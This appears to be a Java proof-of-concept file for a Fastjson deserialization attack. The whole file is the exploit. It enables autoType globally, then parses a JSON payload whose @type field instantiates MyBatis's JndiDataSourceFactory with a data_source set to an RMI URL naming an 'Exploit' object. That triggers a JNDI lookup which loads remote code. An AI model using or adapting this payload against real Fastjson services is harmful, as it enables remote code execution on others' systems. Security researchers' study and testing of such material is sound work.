package com.test.example2;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * Use JDK 7u21
 */
public class Poc5 {
    public static void main(String[] argv) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"," +
                "\"properties\":{\"data_source\":\"rmi://127.0.0.1:1099/Exploit\"}}";
        JSON.parse(payload);
    }
}
